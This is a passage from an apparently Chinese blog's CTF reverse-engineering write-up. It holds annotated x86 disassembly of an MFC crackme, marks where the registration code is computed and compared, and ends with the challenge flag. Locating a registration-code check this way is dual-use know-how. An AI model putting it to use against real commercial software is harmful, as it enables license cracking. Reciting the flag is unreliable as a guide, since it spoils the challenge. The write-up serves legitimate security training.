class="number">0x1A0</span>]         ; 计算注册码</span><br><span class="line"><span class="number">00</span>9F1D0A    <span class="number">83</span>C<span class="number">0</span> <span class="number">01</span>         add eax,<span class="number">0x1</span></span><br><span class="line"><span class="number">00</span>9F1D0D    <span class="number">8985</span> <span class="number">60</span>FEFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1A0</span>],eax</span><br><span class="line"><span class="number">00</span>9F1D13    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1D15    <span class="number">8</span>D4D DC         lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x24</span>]          ; 操作输入的用户名</span><br><span class="line"><span class="number">00</span>9F1D18    FF15 C4F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#7148&gt;]    ; mfc140ud.#7148</span></span><br><span class="line"><span class="number">00</span>9F1D1E    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1D2<span class="number">0</span>    E8 <span class="number">26</span>FDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1D25    <span class="number">3985</span> <span class="number">60</span>FEFFFF   cmp dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1A0</span>],eax</span><br><span class="line"><span class="number">00</span>9F1D2B    0F83 <span class="number">98000000</span>   jnb task_MyC.<span class="number">00</span>9F1DC9</span><br><span class="line"><span class="number">00</span>9F1D31    C785 <span class="number">84</span>FEFFFF <span class="number">0</span>&gt;mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x17C</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">00</span>9F1D3B    C785 <span class="number">54</span>FEFFFF <span class="number">0</span>&gt;mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1AC</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">00</span>9F1D45    EB 0F           jmp short task_MyC.<span class="number">00</span>9F1D56</span><br><span class="line"><span class="number">00</span>9F1D47    <span class="number">8</span>B85 <span class="number">54</span>FEFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1AC</span>]</span><br><span class="line"><span class="number">00</span>9F1D4D    <span class="number">83</span>C<span class="number">0</span> <span class="number">01</span>         add eax,<span class="number">0x1</span></span><br><span class="line"><span class="number">00</span>9F1D5<span class="number">0</span>    <span class="number">8985</span> <span class="number">54</span>FEFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1AC</span>],eax</span><br><span class="line"><span class="number">00</span>9F1D56    <span class="number">83</span>BD <span class="number">54</span>FEFFFF <span class="number">1</span>&gt;cmp dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1AC</span>],<span class="number">0x10</span></span><br><span class="line"><span class="number">00</span>9F1D5D    <span class="number">73</span> <span class="number">2</span>D           jnb short task_MyC.<span class="number">00</span>9F1D8C</span><br><span class="line"><span class="number">00</span>9F1D5F    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1D61    <span class="number">8</span>B85 <span class="number">54</span>FEFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1AC</span>]</span><br><span class="line"><span class="number">00</span>9F1D67    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1D68    <span class="number">8</span>D8D <span class="number">4</span>CFFFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xB4</span>]</span><br><span class="line"><span class="number">00</span>9F1D6E    FF15 FCF3A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1861&gt;]    ; mfc140ud.#1861</span></span><br><span class="line"><span class="number">00</span>9F1D74    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1D76    E8 D0FCFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1D7B    0FB7C8          movzx ecx,ax</span><br><span class="line"><span class="number">00</span>9F1D7E    <span class="number">338</span>D <span class="number">84</span>FEFFFF   xor ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x17C</span>]</span><br><span class="line"><span class="number">00</span>9F1D84    <span class="number">898</span>D <span class="number">84</span>FEFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x17C</span>],ecx</span><br><span class="line"><span class="number">00</span>9F1D8A  ^ EB BB           jmp short task_MyC.<span class="number">00</span>9F1D47</span><br><span class="line"><span class="number">00</span>9F1D8C    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1D8E    <span class="number">8</span>B85 <span class="number">60</span>FEFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1A0</span>]</span><br><span class="line"><span class="number">00</span>9F1D94    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1D95    <span class="number">8</span>D4D DC         lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x24</span>]</span><br><span class="line"><span class="number">00</span>9F1D98    FF15 FCF3A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1861&gt;]    ; mfc140ud.#1861</span></span><br><span class="line"><span class="number">00</span>9F1D9E    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1DA<span class="number">0</span>    E8 A6FCFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1DA5    0FB7C8          movzx ecx,ax</span><br><span class="line"><span class="number">00</span>9F1DA8    <span class="number">338</span>D <span class="number">84</span>FEFFFF   xor ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x17C</span>]</span><br><span class="line"><span class="number">00</span>9F1DAE    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1DB<span class="number">0</span>    <span class="number">51</span>              push ecx</span><br><span class="line"><span class="number">00</span>9F1DB1    <span class="number">8</span>D8D <span class="number">34</span>FFFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xCC</span>]</span><br><span class="line"><span class="number">00</span>9F1DB7    FF15 DCF2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1939&gt;]    ; mfc140ud.#1939</span></span><br><span class="line"><span class="number">00</span>9F1DBD    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1DBF    E8 <span class="number">87</span>FCFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1DC4  ^ E9 <span class="number">3</span>BFFFFFF     jmp task_MyC.<span class="number">00</span>9F1D04</span><br><span class="line"><span class="number">00</span>9F1DC9    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1DCB    <span class="number">8</span>D8D <span class="number">34</span>FFFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xCC</span>]</span><br><span class="line"><span class="number">00</span>9F1DD1    FF15 C4F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#7148&gt;]    ; mfc140ud.#7148</span></span><br><span class="line"><span class="number">00</span>9F1DD7    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1DD9    E8 <span class="number">6</span>DFCFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1DDE    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1DDF    <span class="number">51</span>              push ecx</span><br><span class="line"><span class="number">00</span>9F1DE<span class="number">0</span>    <span class="number">8</span>BCC            mov ecx,esp</span><br><span class="line"><span class="number">00</span>9F1DE2    <span class="number">89</span>A5 F4FBFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x40C</span>],esp</span><br><span class="line"><span class="number">00</span>9F1DE8    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1DEA    <span class="number">8</span>D85 <span class="number">34</span>FFFFFF   lea eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xCC</span>]</span><br><span class="line"><span class="number">00</span>9F1DF<span class="number">0</span>    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1DF1    FF15 CCF2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#286&gt;]     ; mfc140ud.#286</span></span><br><span class="line"><span class="number">00</span>9F1DF7    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1DF9    E8 <span class="number">4</span>DFCFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1DFE    <span class="number">8</span>D8D <span class="number">48</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1B8</span>]         ; 这里就是最终的注册码了</span><br><span class="line"><span class="number">00</span>9F1E04    <span class="number">51</span>              push ecx</span><br><span class="line"><span class="number">00</span>9F1E05    E8 <span class="number">42</span>FBFEFF     call task_MyC.<span class="number">00</span>9E194C</span><br><span class="line"><span class="number">00</span>9F1E0A    <span class="number">83</span>C4 0C         add esp,<span class="number">0xC</span></span><br><span class="line"><span class="number">00</span>9F1E0D    <span class="number">8985</span> ECFBFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x414</span>],eax</span><br><span class="line"><span class="number">00</span>9F1E13    C645 FC 0D      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0xD</span></span><br><span class="line"><span class="number">00</span>9F1E17    C785 <span class="number">3</span>CFEFFFF <span class="number">0</span>&gt;mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1C4</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">00</span>9F1E21    EB 0F           jmp short task_MyC.<span class="number">00</span>9F1E32</span><br><span class="line"><span class="number">00</span>9F1E23    <span class="number">8</span>B85 <span class="number">3</span>CFEFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1C4</span>]</span><br><span class="line"><span class="number">00</span>9F1E29    <span class="number">83</span>C<span class="number">0</span> <span class="number">01</span>         add eax,<span class="number">0x1</span></span><br><span class="line"><span class="number">00</span>9F1E2C    <span class="number">8985</span> <span class="number">3</span>CFEFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1C4</span>],eax</span><br><span class="line"><span class="number">00</span>9F1E32    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1E34    <span class="number">8</span>D8D <span class="number">48</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1B8</span>]</span><br><span class="line"><span class="number">00</span>9F1E3A    FF15 C4F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#7148&gt;]    ; mfc140ud.#7148</span></span><br><span class="line"><span class="number">00</span>9F1E4<span class="number">0</span>    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1E42    E8 <span class="number">04</span>FCFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1E47    <span class="number">3985</span> <span class="number">3</span>CFEFFFF   cmp dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1C4</span>],eax</span><br><span class="line"><span class="number">00</span>9F1E4D    <span class="number">73</span> <span class="number">72</span>           jnb short task_MyC.<span class="number">00</span>9F1EC1</span><br><span class="line"><span class="number">00</span>9F1E4F    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1E51    <span class="number">8</span>B85 <span class="number">3</span>CFEFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1C4</span>]</span><br><span class="line"><span class="number">00</span>9F1E57    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1E58    <span class="number">8</span>D8D <span class="number">48</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1B8</span>]</span><br><span class="line"><span class="number">00</span>9F1E5E    FF15 FCF3A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1861&gt;]    ; mfc140ud.#1861</span></span><br><span class="line"><span class="number">00</span>9F1E64    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1E66    E8 E0FBFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1E6B    0FB7F<span class="number">0</span>          movzx esi,ax</span><br><span class="line"><span class="number">00</span>9F1E6E    <span class="number">8</span>BFC            mov edi,esp</span><br><span class="line"><span class="number">00</span>9F1E7<span class="number">0</span>    <span class="number">8</span>B8D <span class="number">3</span>CFEFFFF   mov ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1C4</span>]</span><br><span class="line"><span class="number">00</span>9F1E76    <span class="number">51</span>              push ecx</span><br><span class="line"><span class="number">00</span>9F1E77    <span class="number">8</span>B4D E8         mov ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x18</span>]</span><br><span class="line"><span class="number">00</span>9F1E7A    <span class="number">81</span>C1 D800000<span class="number">0</span>   add ecx,<span class="number">0xD8</span></span><br><span class="line"><span class="number">00</span>9F1E8<span class="number">0</span>    FF15 FCF3A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1861&gt;]    ; mfc140ud.#1861</span></span><br><span class="line"><span class="number">00</span>9F1E86    <span class="number">3</span>BFC            cmp edi,esp</span><br><span class="line"><span class="number">00</span>9F1E88    E8 BEFBFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1E8D    0FB7D<span class="number">0</span>          movzx edx,ax</span><br><span class="line"><span class="number">00</span>9F1E9<span class="number">0</span>    <span class="number">3</span>BF2            cmp esi,edx</span><br><span class="line"><span class="number">00</span>9F1E92    <span class="number">75</span> <span class="number">04</span>           jnz short task_MyC.<span class="number">00</span>9F1E98              ; 这里对比计算所得的注册码和输入的注册码</span><br><span class="line"><span class="number">00</span>9F1E94  ^ EB <span class="number">8</span>D           jmp short task_MyC.<span class="number">00</span>9F1E23</span><br><span class="line"><span class="number">00</span>9F1E96    EB <span class="number">24</span>           jmp short task_MyC.<span class="number">00</span>9F1EBC</span><br><span class="line"><span class="number">00</span>9F1E98    <span class="number">6</span>A <span class="number">00</span>           push <span class="number">0x0</span></span><br><span class="line"><span class="number">00</span>9F1E9A    <span class="number">6</span>A <span class="number">00</span>           push <span class="number">0x0</span></span><br><span class="line"><span class="number">00</span>9F1E9C    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1E9E    <span class="number">8</span>D8D <span class="number">78</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x188</span>]</span><br><span class="line"><span class="number">00</span>9F1EA4    FF15 BCF2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1885&gt;]    ; mfc140ud.#1885</span></span><br><span class="line"><span class="number">00</span>9F1EAA    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1EAC    E8 <span class="number">9</span>AFBFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1EB1    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1EB2    <span class="number">8</span>B4D E8         mov ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x18</span>]</span><br><span class="line"><span class="number">00</span>9F1EB5    E8 <span class="number">16</span>F9FEFF     call task_MyC.<span class="number">00</span>9E17D<span class="number">0</span></span><br></pre></td></tr></table></figure><p>经过分析（加上瞎猜，毕竟不会有人愿意看那堆又臭又长的汇编代码的），发现在栈中出现了最终加密好的注册码：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555914157315.png" alt="1555914157315.png"></p><p>重新运行程序，输入注册码验证，正确。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555914291521.png" alt="1555914291521.png"></p><p>所以最终的flag为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDUTCTF&#123;HhkICQIvOCs4Ly44&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
